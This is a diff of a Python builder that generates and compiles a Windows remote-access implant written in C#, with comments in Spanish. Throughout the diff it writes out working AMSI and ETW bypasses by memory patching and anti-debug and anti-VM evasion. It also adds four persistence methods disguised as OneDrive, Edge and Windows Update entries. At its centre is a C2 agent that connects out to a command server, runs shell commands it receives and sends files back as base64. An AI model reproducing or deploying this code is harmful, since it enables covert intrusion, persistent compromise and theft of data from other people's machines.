+                    patch,
+                    patch.Length,
+                    out bytesWritten
+                );
+                
+                VirtualProtect(asbAddr, (UIntPtr)patch.Length, oldProtect, out _);
+                
+                if (success)
+                    return true;
+            }
+            catch { }
+            
+            // Método 2: Reflection bypass
+            try
+            {
+                var amsiUtils = typeof(System.Management.Automation.PSObject).Assembly
+                    .GetType("System.Management.Automation.AmsiUtils");
+                
+                if (amsiUtils != null)
+                {
+                    var amsiInitFailed = amsiUtils.GetField(
+                        "amsiInitFailed", 
+                        System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static
+                    );
+                    
+                    if (amsiInitFailed != null)
+                    {
+                        amsiInitFailed.SetValue(null, true);
+                        return true;
+                    }
+                }
+            }
+            catch { }
+            
+            return false;
+        }
+        '''
+    
+    def _generate_etw_bypass(self):
+        """Generar métodos de bypass ETW"""
+        
+        return '''
+        // ============================================================================
+        // ETW BYPASS METHODS
+        // ============================================================================
+        
+        static bool BypassETW()
+        {
+            try
+            {
+                // Método 1: NtSetInformationProcess
+                uint processDebugFlags = 0x1F;
+                uint disableEtw = 1;
+                
+                uint result = NtSetInformationProcess(
+                    Process.GetCurrentProcess().Handle,
+                    processDebugFlags,
+                    ref disableEtw,
+                    sizeof(uint)
+                );
+                
+                if (result == 0)
+                    return true;
+            }
+            catch { }
+            
+            // Método 2: Patch EtwEventWrite
+            try
+            {
+                IntPtr ntdll = LoadLibrary("ntdll.dll");
+                if (ntdll != IntPtr.Zero)
+                {
+                    IntPtr etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
+                    if (etwEventWriteAddr != IntPtr.Zero)
+                    {
+                        byte[] patch = new byte[] { 0xC3 }; // ret
+                        
+                        uint oldProtect;
+                        if (VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
+                        {
+                            Marshal.Copy(patch, 0, etwEventWriteAddr, patch.Length);
+                            VirtualProtect(etwEventWriteAddr, (UIntPtr)patch.Length, oldProtect, out _);
+                            return true;
+                        }
+                    }
+                }
+            }
+            catch { }
+            
+            return false;
+        }
+        '''
+    
+    def _generate_smartscreen_bypass(self):
+        """Generar métodos de bypass SmartScreen"""
+        
+        return '''
+        // ============================================================================
+        // SMARTSCREEN BYPASS METHODS
+        // ============================================================================
+        
+        static bool BypassSmartScreen()
+        {
+            // Esta función sería implementada en una versión más avanzada
+            // para modificar el manifest del ejecutable
+            return true;
+        }
+        '''
+    
+    def _generate_persistence_methods(self):
+        """Generar métodos de persistencia"""
+        
+        return '''
+        // ============================================================================
+        // PERSISTENCE METHODS
+        // ============================================================================
+        
+        static bool InstallPersistence()
+        {
+            try
+            {
+                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
+                
+                // 1. Registry Run Key
+                InstallRegistryPersistence(currentPath);
+                
+                // 2. Scheduled Task
+                InstallScheduledTask(currentPath);
+                
+                // 3. Startup Folder
+                InstallStartupFolderPersistence(currentPath);
+                
+                // 4. WMI Event Subscription (si es admin)
+                if (IsAdministrator())
+                {
+                    InstallWMIPersistence(currentPath);
+                }
+                
+                return true;
+            }
+            catch (Exception ex)
+            {
+                return false;
+            }
+        }
+        
+        static bool InstallRegistryPersistence(string payloadPath)
+        {
+            try
+            {
+                RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
+                    @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                
+                if (runKey != null)
+                {
+                    string valueName = "OneDriveSync_" + Guid.NewGuid().ToString().Substring(0, 4);
+                    string valueData = @"""powershell"" -WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""";
+                    
+                    runKey.SetValue(valueName, valueData);
+                    runKey.Close();
+                    
+                    return true;
+                }
+            }
+            catch { }
+            
+            return false;
+        }
+        
+        static bool InstallScheduledTask(string payloadPath)
+        {
+            try
+            {
+                string taskName = "MicrosoftEdgeUpdate_" + Guid.NewGuid().ToString().Substring(0, 4);
+                string command = @"schtasks /create /tn """ + taskName + @""" /tr """ + 
+                               @"""powershell"" -WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""" + 
+                               @" /sc onstart /ru SYSTEM /f";
+                
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "cmd.exe";
+                psi.Arguments = "/c " + command;
+                psi.RedirectStandardOutput = true;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                
+                Process process = Process.Start(psi);
+                process.WaitForExit(5000);
+                
+                return process.ExitCode == 0;
+            }
+            catch { }
+            
+            return false;
+        }
+        
+        static bool InstallStartupFolderPersistence(string payloadPath)
+        {
+            try
+            {
+                string startupPath = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
+                    "Microsoft Edge.lnk"
+                );
+                
+                string shortcutCommand = @"$WshShell = New-Object -ComObject WScript.Shell;" +
+                                        @"$Shortcut = $WshShell.CreateShortcut('" + startupPath + @"');" +
+                                        @"$Shortcut.TargetPath = 'powershell.exe';" +
+                                        @"$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""';" +
+                                        @"$Shortcut.WindowStyle = 7;" +
+                                        @"$Shortcut.Save()";
+                
+                return ExecutePowerShell(shortcutCommand);
+            }
+            catch { }
+            
+            return false;
+        }
+        
+        static bool InstallWMIPersistence(string payloadPath)
+        {
+            try
+            {
+                string wmiScript = @"$FilterName = 'WindowsUpdateMonitor_' + (New-Guid).ToString().Substring(0, 8);" +
+                                  @"$ConsumerName = 'WindowsUpdateService_' + (New-Guid).ToString().Substring(0, 8);" +
+                                  @"$FilterArgs = @{Name = $FilterName; EventNamespace = 'root\\cimv2'; Query = \\""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\""};" +
+                                  @"$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs;" +
+                                  @"$ConsumerArgs = @{Name = $ConsumerName; CommandLineTemplate = \\""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + payloadPath + @"'\\""};" +
+                                  @"$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs;" +
+                                  @"$BindingArgs = @{Filter = $Filter; Consumer = $Consumer};" +
+                                  @"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs";
+                
+                return ExecutePowerShell(wmiScript);
+            }
+            catch { }
+            
+            return false;
+        }
+        
+        static bool ExecutePowerShell(string script)
+        {
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "powershell.exe";
+                psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + script + @"\\"";
+                psi.RedirectStandardOutput = true;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                
+                Process process = Process.Start(psi);
+                process.WaitForExit(5000);
+                
+                return process.ExitCode == 0;
+            }
+            catch { }
+            
+            return false;
+        }
+        
+        static bool IsAdministrator()
+        {
+            try
+            {
+                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        '''
+    
+    def _generate_obfuscation_methods(self):
+        """Generar métodos de ofuscación"""
+        
+        return '''
+        // ============================================================================
+        // OBFUSCATION METHODS
+        // ============================================================================
+        
+        static string ObfuscateString(string input)
+        {
+            try
+            {
+                // 1. Convertir a base64
+                byte[] bytes = Encoding.UTF8.GetBytes(input);
+                string base64 = Convert.ToBase64String(bytes);
+                
+                // 2. Dividir en partes
+                List<string> parts = new List<string>();
+                for (int i = 0; i < base64.Length; i += 4)
+                {
+                    int length = Math.Min(4, base64.Length - i);
+                    parts.Add(@""" + base64.Substring(i, length) + @""");
+                }
+                
+                // 3. Reconstruir
+                return "string obfuscated = string.Join(\\"\\", new string[] { " + string.Join(", ", parts) + " });";
+            }
+            catch
+            {
+                return input;
+            }
+        }
+        
+        static byte[] XorEncrypt(byte[] data, byte[] key)
+        {
+            byte[] encrypted = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++)
+            {
+                encrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
+            }
+            return encrypted;
+        }
+        
+        static string GenerateRandomString(int length)
+        {
+            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            Random random = new Random();
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+        '''
+    
+    def _generate_antidebug_methods(self):
+        """Generar métodos anti-debugging"""
+        
+        return '''
+        // ============================================================================
+        // ANTI-DEBUGGING METHODS
+        // ============================================================================
+        
+        static bool CheckDebugger()
+        {
+            // 1. IsDebuggerPresent API
+            if (IsDebuggerPresent())
+                return true;
+            
+            // 2. CheckRemoteDebuggerPresent
+            bool isDebuggerPresent = false;
+            if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent))
+            {
+                if (isDebuggerPresent)
+                    return true;
+            }
+            
+            // 3. Debugger.IsAttached
+            if (Debugger.IsAttached)
+                return true;
+            
+            // 4. Timing check
+            var sw = Stopwatch.StartNew();
+            for (int i = 0; i < 1000000; i++) { }
+            sw.Stop();
+            
+            if (sw.ElapsedMilliseconds > 100) // Tiempo anormal
+                return true;
+            
+            return false;
+        }
+        
+        static void AntiDebugActions()
+        {
+            if (CheckDebugger())
+            {
+                // Intentar técnicas de evasión
+                try
+                {
+                    // 1. Terminar proceso
+                    Environment.Exit(0);
+                    
+                    // 2. Crash elegante
+                    Environment.FailFast("Critical system error");
+                }
+                catch
+                {
+                    // 3. Bucle infinito
+                    while (true)
+                    {
+                        Thread.Sleep(1000);
+                    }
+                }
+            }
+        }
+        '''
+    
+    def _generate_antivm_methods(self):
+        """Generar métodos anti-VM/Sandbox"""
+        
+        return '''
+        // ============================================================================
+        // ANTI-VM/SANDBOX METHODS
+        // ============================================================================
+        
+        static bool CheckVirtualEnvironment()
+        {
+            try
+            {
+                // 1. Check for known VM processes
+                string[] vmProcesses = {
+                    "vboxservice", "vboxtray", "vmwaretray", "vmwareuser",
+                    "vmtoolsd", "vmware", "vmusrvc", "vmsrvc"
+                };
+                
+                Process[] processes = Process.GetProcesses();
+                foreach (var process in processes)
+                {
+                    string name = process.ProcessName.ToLower();
+                    if (vmProcesses.Any(vm => name.Contains(vm)))
+                        return true;
+                }
+                
+                // 2. Check RAM (VM often have less RAM)
+                var pc = new System.Management.ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
+                foreach (var item in pc.Get())
+                {
+                    ulong ram = Convert.ToUInt64(item["TotalPhysicalMemory"]);
+                    if (ram < 2147483648) // Less than 2GB
+                        return true;
+                }
+                
+                // 3. Check CPU cores
+                int coreCount = Environment.ProcessorCount;
+                if (coreCount < 2)
+                    return true;
+                
+                // 4. Check for VM artifacts in registry
+                string[] vmRegistryKeys = {
+                    @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
+                    @"HARDWARE\Description\System\SystemBiosVersion",
+                    @"HARDWARE\Description\System\VideoBiosVersion"
+                };
+                
+                foreach (var key in vmRegistryKeys)
+                {
+                    try
+                    {
+                        using (RegistryKey regKey = Registry.LocalMachine.OpenSubKey(key))
+                        {
+                            if (regKey != null)
+                            {
+                                string value = regKey.GetValue("")?.ToString() ?? "";
+                                if (value.Contains("VMware") || value.Contains("Virtual") || 
+                                    value.Contains("VBox") || value.Contains("QEMU"))
+                                    return true;
+                            }
+                        }
+                    }
+                    catch { }
+                }
+            }
+            catch { }
+            
+            return false;
+        }
+        '''
+    
+    def _generate_main_method(self, features):
+        """Generar método Main"""
+        
+        main_code = '''
+        // ============================================================================
+        // MAIN ENTRY POINT
+        // ============================================================================
         
         static void Main(string[] args)
-        {{
-            // Aplicar todas las técnicas de bypass al inicio
-            ApplyAllBypasses();
-            
-            // Ocultar consola
+        {
+            '''
+        
+        # Añadir técnicas según features
+        if 'antidebug' in features:
+            main_code += '''
+            // Anti-debugging
+            AntiDebugActions();
+            '''
+        
+        if 'antivm' in features:
+            main_code += '''
+            // Anti-VM/Sandbox
+            if (CheckVirtualEnvironment())
+            {
+                Environment.Exit(0);
+            }
+            '''
+        
+        # Aplicar bypasses
+        bypass_applications = []
+        if 'amsi' in features:
+            bypass_applications.append("BypassAMSI()")
+        if 'etw' in features:
+            bypass_applications.append("BypassETW()")
+        if 'smart_screen' in features:
+            bypass_applications.append("BypassSmartScreen()")
+        
+        if bypass_applications:
+            main_code += '''
+            // Aplicar técnicas de bypass
+            try
+            {
+                ''' + "\n                ".join(bypass_applications) + '''
+            }
+            catch { }
+            '''
+        
+        # Ocultar consola
+        main_code += '''
+            // Ocultar ventana de consola
             HideConsole();
             
-            // Anti-debugging mejorado
-            AdvancedAntiDebug();
-            
-            // Instalar persistencia si es necesario
+            '''
+        
+        # Instalar persistencia si se solicita
+        if 'persistence' in features:
+            main_code += '''
+            // Instalar persistencia si se especifica
             if (args.Length > 0 && args[0] == "--install")
-            {{
+            {
                 InstallPersistence();
-            }}
-            
+            }
+            '''
+        
+        # Iniciar agente
+        main_code += '''
             // Iniciar agente en thread separado
             Thread agentThread = new Thread(new ThreadStart(AgentMain));
             agentThread.IsBackground = true;
             agentThread.Start();
             
-            // Mantener proceso vivo
+            // Mantener proceso principal vivo
             while (true)
-            {{
-                Thread.Sleep(1000);
-            }}
-        }}
+            {
+                Thread.Sleep(10000);
+            }
+        }
+        '''
         
-        static void ApplyAllBypasses()
-        {{
-            try
-            {{
-                // 1. Bypass AMSI
-                AmsiBypassAdvanced.PatchAmsiScanBuffer();
-                AmsiBypassAdvanced.BypassAmsiReflection();
-                AmsiBypassAdvanced.BypassAmsiContext();
-                
-                // 2. Bypass ETW
-                EtwBypassAdvanced.DisableEtwViaNtSet();
-                EtwBypassAdvanced.PatchEtwEventWrite();
-                EtwBypassAdvanced.PatchEtwEventWriteFull();
-                
-                // 3. Bypass SmartScreen (si estamos en el ejecutable principal)
-                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
-                SmartScreenBypass.AddLegitManifest(currentExe);
-                
-            }}
-            catch {{ }}
-        }}
+        return main_code
+    
+    def _generate_agent_methods(self, features):
+        """Generar métodos principales del agente"""
+        
+        return '''
+        // ============================================================================
+        // AGENT METHODS
+        // ============================================================================
         
         static void HideConsole()
-        {{
-            FreeConsole();
-            
-            IntPtr consoleWindow = GetConsoleWindow();
-            if (consoleWindow != IntPtr.Zero)
-            {{
-                ShowWindow(consoleWindow, SW_HIDE);
-            }}
-        }}
-        
-        static void AdvancedAntiDebug()
-        {{
-            if (IsDebuggerPresent() || Debugger.IsAttached)
-            {{
-                // Técnicas avanzadas anti-debug
-                for (int i = 0; i < 5; i++)
-                {{
-                    Thread.Sleep(200);
-                    if (!IsDebuggerPresent()) break;
-                }}
-                
-                if (IsDebuggerPresent())
-                {{
-                    // Intentar crash elegante
-                    try
-                    {{
-                        Environment.FailFast("Critical system error");
-                    }}
-                    catch
-                    {{
-                        Environment.Exit(0);
-                    }}
-                }}
-            }}
-        }}
-        
-        static void InstallPersistence()
-        {{
+        {
             try
-            {{
-                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
+            {
+                FreeConsole();
                 
-                // Intentar múltiples métodos de persistencia
-                AdvancedPersistence.InstallWmiPersistence(currentPath);
-                Thread.Sleep(1000);
-                
-                AdvancedPersistence.InstallScheduledTask(currentPath);
-                Thread.Sleep(1000);
-                
-                AdvancedPersistence.InstallRegistryPersistence(currentPath);
-                Thread.Sleep(1000);
-                
-                AdvancedPersistence.InstallStartupFolder(currentPath);
-            }}
-            catch {{ }}
-        }}
+                IntPtr consoleWindow = GetConsoleWindow();
+                if (consoleWindow != IntPtr.Zero)
+                {
+                    ShowWindow(consoleWindow, SW_HIDE);
+                }
+            }
+            catch { }
+        }
         
         static void AgentMain()
-        {{
+        {
             // Esperar inicialización
-            Thread.Sleep(10000);
+            Thread.Sleep(5000);
             
             while (true)
-            {{
+            {
                 try
-                {{
+                {
                     using (TcpClient client = new TcpClient(C2_SERVER, C2_PORT))
-                    {{
+                    {
                         NetworkStream stream = client.GetStream();
                         
-                        // Enviar handshake mejorado
-                        SendEnhancedHandshake(stream);
+                        // Enviar handshake
+                        SendHandshake(stream);
                         
-                        // Loop principal
+                        // Loop principal de comandos
                         CommandLoop(stream);
-                    }}
-                }}
-                catch
-                {{
+                    }
+                }
+                catch (Exception ex)
+                {
+                    // Error de conexión, esperar y reintentar
                     Thread.Sleep(BEACON_INTERVAL * 1000);
-                }}
-                
-                Thread.Sleep(BEACON_INTERVAL * 1000);
-            }}
-        }}
+                }
+            }
+        }
         
-        static void SendEnhancedHandshake(NetworkStream stream)
-        {{
+        static void SendHandshake(NetworkStream stream)
+        {
             string hostname = Environment.MachineName;
             string username = Environment.UserName;
             string os = Environment.OSVersion.ToString();
             string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
             
-            string handshake = @"{{
-                ""type"": ""agent_handshake"",
-                ""session_id"": """ + SESSION_ID + @""",
-                ""hostname"": """ + hostname + @""",
-                ""username"": """ + username + @""",
-                ""os"": """ + os + @""",
-                ""arch"": """ + arch + @""",
-                ""windows11"": " + (os.Contains("10.0.2")).ToString().ToLower() + @",
-                ""pid"": " + Process.GetCurrentProcess().Id + @",
-                ""integrity"": """ + GetIntegrityLevel() + @""",
-                ""bypass_status"": {{
-                    ""amsi"": true,
-                    ""etw"": true,
-                    ""persistence"": true,
-                    ""obfuscation"": true
-                }},
-                ""capabilities"": [""shell"", ""file_transfer"", ""process_injection"", ""persistence_install""]
-            }}";
+            string handshake = "{"
+                + "\\"type\\": \\"agent_handshake\\","
+                + "\\"session_id\\": \\"" + SESSION_ID + "\\","
+                + "\\"agent_id\\": \\"" + AGENT_ID + "\\","
+                + "\\"hostname\\": \\"" + hostname + "\\","
+                + "\\"username\\": \\"" + username + "\\","
+                + "\\"os\\": \\"" + os + "\\","
+                + "\\"arch\\": \\"" + arch + "\\","
+                + "\\"pid\\": " + Process.GetCurrentProcess().Id + ","
+                + "\\"integrity\\": \\"" + GetIntegrityLevel() + "\\""
+                + "}";
             
             byte[] data = Encoding.UTF8.GetBytes(handshake);
             SendData(stream, data);
-        }}
+        }
         
         static string GetIntegrityLevel()
-        {{
+        {
             try
-            {{
+            {
                 var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                 var principal = new System.Security.Principal.WindowsPrincipal(identity);
                 
@@ -898,75 +992,75 @@ namespace SilentAgentEnhanced
                     return "Medium";
                 else
                     return "Low";
-            }}
+            }
             catch
-            {{
+            {
                 return "Unknown";
-            }}
-        }}
+            }
+        }
         
         static void CommandLoop(NetworkStream stream)
-        {{
+        {
             byte[] buffer = new byte[4096];
             
             while (true)
-            {{
+            {
                 try
-                {{
+                {
                     if (stream.DataAvailable)
-                    {{
+                    {
                         int bytesRead = stream.Read(buffer, 0, buffer.Length);
                         if (bytesRead > 0)
-                        {{
+                        {
                             string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                             ProcessCommand(message, stream);
-                        }}
-                    }}
+                        }
+                    }
                     
                     Thread.Sleep(1000);
-                }}
+                }
                 catch
-                {{
+                {
                     break;
-                }}
-            }}
-        }}
+                }
+            }
+        }
         
         static void ProcessCommand(string message, NetworkStream stream)
-        {{
+        {
             try
-            {{
+            {
                 // Parsear comando JSON simple
-                if (message.Contains("command"))
-                {{
-                    if (message.Contains("shell"))
-                    {{
-                        string cmd = ExtractValue(message, "command");
+                if (message.Contains("\\"command\\""))
+                {
+                    if (message.Contains("\\"shell\\""))
+                    {
+                        string cmd = ExtractJsonValue(message, "command");
                         ExecuteShellCommand(cmd, stream);
-                    }}
-                    else if (message.Contains("persistence"))
-                    {{
+                    }
+                    else if (message.Contains("\\"download\\""))
+                    {
+                        string filePath = ExtractJsonValue(message, "file");
+                        DownloadFile(filePath, stream);
+                    }
+                    else if (message.Contains("\\"persistence\\""))
+                    {
                         InstallPersistence();
-                        SendResponse(stream, "Persistence installed");
-                    }}
-                    else if (message.Contains("bypass"))
-                    {{
-                        ApplyAllBypasses();
-                        SendResponse(stream, "Bypasses applied");
-                    }}
-                    else if (message.Contains("exit"))
-                    {{
+                        SendResponse(stream, "Persistence installed successfully");
+                    }
+                    else if (message.Contains("\\"exit\\""))
+                    {
                         Environment.Exit(0);
-                    }}
-                }}
-            }}
-            catch {{ }}
-        }}
+                    }
+                }
+            }
+            catch { }
+        }
         
         static void ExecuteShellCommand(string command, NetworkStream stream)
-        {{
+        {
             try
-            {{
+            {
                 ProcessStartInfo psi = new ProcessStartInfo();
                 psi.FileName = "cmd.exe";
                 psi.Arguments = "/c " + command;
@@ -982,778 +1076,487 @@ namespace SilentAgentEnhanced
                 
                 string result = output + error;
                 SendResponse(stream, result);
-            }}
+            }
             catch (Exception ex)
-            {{
+            {
                 SendResponse(stream, "Error: " + ex.Message);
-            }}
-        }}
+            }
+        }
         
-        static string ExtractValue(string json, string key)
-        {{
+        static void DownloadFile(string filePath, NetworkStream stream)
+        {
             try
-            {{
-                int start = json.IndexOf(key) + key.Length + 3;
+            {
+                if (File.Exists(filePath))
+                {
+                    byte[] fileData = File.ReadAllBytes(filePath);
+                    string base64Data = Convert.ToBase64String(fileData);
+                    string fileName = Path.GetFileName(filePath);
+                    
+                    string response = "{"
+                        + "\\"type\\": \\"file_download\\","
+                        + "\\"filename\\": \\"" + fileName + "\\","
+                        + "\\"data\\": \\"" + base64Data + "\\","
+                        + "\\"size\\": " + fileData.Length
+                        + "}";
+                    
+                    SendData(stream, Encoding.UTF8.GetBytes(response));
+                }
+                else
+                {
+                    SendResponse(stream, "File not found: " + filePath);
+                }
+            }
+            catch (Exception ex)
+            {
+                SendResponse(stream, "Download error: " + ex.Message);
+            }
+        }
+        
+        static string ExtractJsonValue(string json, string key)
+        {
+            try
+            {
+                int start = json.IndexOf("\\"" + key + "\\"") + key.Length + 3;
                 int end = json.IndexOf("\\"", start);
                 return json.Substring(start, end - start);
-            }}
+            }
             catch
-            {{
+            {
                 return "";
-            }}
-        }}
+            }
+        }
         
         static void SendResponse(NetworkStream stream, string message)
-        {{
+        {
             try
-            {{
-                string response = @"{{""response"": """ + EscapeJson(message) + @"""}}";
-                byte[] data = Encoding.UTF8.GetBytes(response);
-                SendData(stream, data);
-            }}
-            catch {{ }}
-        }}
+            {
+                string response = "{"
+                    + "\\"type\\": \\"response\\","
+                    + "\\"message\\": \\"" + EscapeJson(message) + "\\""
+                    + "}";
+                
+                SendData(stream, Encoding.UTF8.GetBytes(response));
+            }
+            catch { }
+        }
         
         static string EscapeJson(string input)
-        {{
-            if (string.IsNullOrEmpty(input)) return "";
-            return input.Replace("\\\\", "\\\\\\\\").Replace("\\"", "\\\\\\"").Replace("\\n", "\\\\n").Replace("\\r", "\\\\r");
-        }}
+        {
+            if (string.IsNullOrEmpty(input))
+                return "";
+            
+            return input.Replace("\\\\", "\\\\\\\\")
+                       .Replace("\\"", "\\\\\\"")
+                       .Replace("\\n", "\\\\n")
+                       .Replace("\\r", "\\\\r");
+        }
         
         static void SendData(NetworkStream stream, byte[] data)
-        {{
+        {
             try
-            {{
+            {
                 byte[] lengthBytes = BitConverter.GetBytes(data.Length);
                 stream.Write(lengthBytes, 0, 4);
                 stream.Write(data, 0, data.Length);
-            }}
-            catch {{ }}
-        }}
-    }}
-}}
-'''
-        
-        # Guardar archivo
-        cs_file = output_file.replace('.exe', '.cs')
-        with open(cs_file, 'w', encoding='utf-8') as f:
-            f.write(csharp_code)
-        
-        print(f"[+] Agente mejorado generado: {cs_file}")
-        print(f"[+] Características incluidas: {', '.join(features)}")
-        
-        # Generar script de compilación
-        self._generate_build_script(cs_file, output_file, features)
-        
-        return cs_file
-    
-    def _generate_obfuscated_config(self, c2_server, c2_port, session_id):
-        """Generar configuración ofuscada"""
-        
-        # Generar nombres de variables aleatorios
-        var_names = {
-            'C2_SERVER': self._generate_random_name(),
-            'C2_PORT': self._generate_random_name(),
-            'SESSION_ID': self._generate_random_name(),
-            'BEACON_INTERVAL': self._generate_random_name()
+            }
+            catch { }
         }
-        
-        # Crear código ofuscado
-        code = f'''
-        private static string {var_names["C2_SERVER"]} = DecodeString("{base64.b64encode(c2_server.encode()).decode()}");
-        private static int {var_names["C2_PORT"]} = {c2_port};
-        private static string {var_names["SESSION_ID"]} = "{session_id}";
-        private static int {var_names["BEACON_INTERVAL"]} = 45;
-        
-        // Variables públicas (alias)
-        private static string C2_SERVER => {var_names["C2_SERVER"]};
-        private static int C2_PORT => {var_names["C2_PORT"]};
-        private static string SESSION_ID => {var_names["SESSION_ID"]};
-        private static int BEACON_INTERVAL => {var_names["BEACON_INTERVAL"]};
-        
-        private static string DecodeString(string base64)
-        {{
-            try
-            {{
-                byte[] bytes = Convert.FromBase64String(base64);
-                return Encoding.UTF8.GetString(bytes);
-            }}
-            catch
-            {{
-                return "";
-            }}
-        }}
         '''
-        
-        return code
     
-    def _generate_random_name(self, length=12):
-        """Generar nombre de variable aleatorio"""
-        chars = string.ascii_letters
-        return ''.join(random.choice(chars) for _ in range(length))
-    
-    def _generate_build_script(self, cs_file, output_file, features):
-        """Generar script de compilación"""
+    def _generate_compilation_script(self, cs_file, output_file, features):
+        """Generar script de compilación para Windows"""
         
-        build_script = f'''@echo off
-REM Script de compilación para agente mejorado
-REM Características: {', '.join(features)}
+        features_desc = "\n".join([f"    • {self.features[feat]}" for feat in features])
+        
+        script = f'''@echo off
+REM ============================================================================
+REM SCRIPT DE COMPILACIÓN PARA AGENTE WINDOWS
+REM Generado: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+REM ============================================================================
 
-echo [*] Compilando agente mejorado...
+echo.
+echo ╔══════════════════════════════════════════════════════════════════╗
+echo ║               COMPILACIÓN DE AGENTE WINDOWS 11                   ║
+echo ╚══════════════════════════════════════════════════════════════════╝
+echo.
 
-REM Verificar compilador C#
+echo [*] Verificando entorno de compilación...
+
+REM Buscar compilador C#
+set CSC_PATH=
 where csc >nul 2>&1
-if %ERRORLEVEL% neq 0 (
-    echo [!] No se encontró csc.exe
-    echo [*] Intentando encontrar compilador...
+if %ERRORLEVEL% equ 0 (
+    set CSC_PATH=csc.exe
+    echo [+] Compilador encontrado en PATH: csc.exe
+) else (
+    echo [!] Compilador no encontrado en PATH, buscando en rutas comunes...
     
-    REM Buscar en rutas comunes
     if exist "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" (
         set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe
+        echo [+] Compilador encontrado: %CSC_PATH%
     ) else if exist "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe" (
         set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe
+        echo [+] Compilador encontrado: %CSC_PATH%
+    ) else if exist "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe" (
+        set CSC_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe
+        echo [+] Compilador encontrado: %CSC_PATH%
     ) else (
-        echo [!] Instale .NET Framework o Visual Studio
+        echo [!] No se encontró el compilador C# (csc.exe)
+        echo [*] Instalación requerida:
+        echo     1. .NET Framework Developer Pack: https://dotnet.microsoft.com/download
+        echo     2. O Visual Studio Build Tools
+        echo.
         pause
         exit /b 1
     )
-) else (
-    set CSC_PATH=csc.exe
 )
 
-echo [+] Compilador: %CSC_PATH%
+echo.
+echo [*] Características incluidas:
+{features_desc}
 
-REM Compilar
-"%CSC_PATH%" /target:winexe /out:{output_file} /reference:"Microsoft.Win32.Registry.dll" /reference:"System.Management.dll" {cs_file}
+echo.
+echo [*] Compilando {cs_file}...
+
+REM Construir comando de compilación
+set COMPILE_CMD="%CSC_PATH%" /target:winexe /out:{output_file} /reference:Microsoft.Win32.Registry.dll /reference:System.Management.dll /optimize+ /unsafe /nowarn:CS0168,CS0219 {cs_file}
+
+echo Comando: %COMPILE_CMD%
+echo.
+
+REM Ejecutar compilación
+%COMPILE_CMD%
 
 if %ERRORLEVEL% equ 0 (
-    echo [+] Compilación exitosa: {output_file}
     echo.
-    echo [*] Características incluidas:
-    echo     - AMSI Bypass (Windows 11 compatible)
-    echo     - ETW Bypass
-    echo     - Persistencia avanzada (WMI, Scheduled Tasks)
-    echo     - Ofuscación real-time
-    echo     - SmartScreen bypass
+    echo ╔══════════════════════════════════════════════════════════════════╗
+    echo ║                    COMPILACIÓN EXITOSA                          ║
+    echo ╚══════════════════════════════════════════════════════════════════╝
     echo.
-    echo [*] Uso:
+    
+    for %%F in ({output_file}) do (
+        set SIZE=%%~zF
+    )
+    
+    echo [+] Archivo generado: {output_file}
+    echo [+] Tamaño: %SIZE% bytes
+    echo.
+    
+    echo [*] MODO DE USO:
     echo     {output_file}              - Ejecutar agente
     echo     {output_file} --install    - Instalar persistencia
     echo.
-    echo [*] Comandos C2 disponibles:
-    echo     shell <command>         - Ejecutar comando
-    echo     persistence             - Instalar persistencia
-    echo     bypass                  - Aplicar bypasses
-    echo     exit                    - Salir
+    
+    echo [*] COMANDOS DISPONIBLES:
+    echo     shell <comando>          - Ejecutar comando CMD/PowerShell
+    echo     download <archivo>       - Descargar archivo
+    echo     persistence              - Instalar persistencia
+    echo     exit                     - Terminar agente
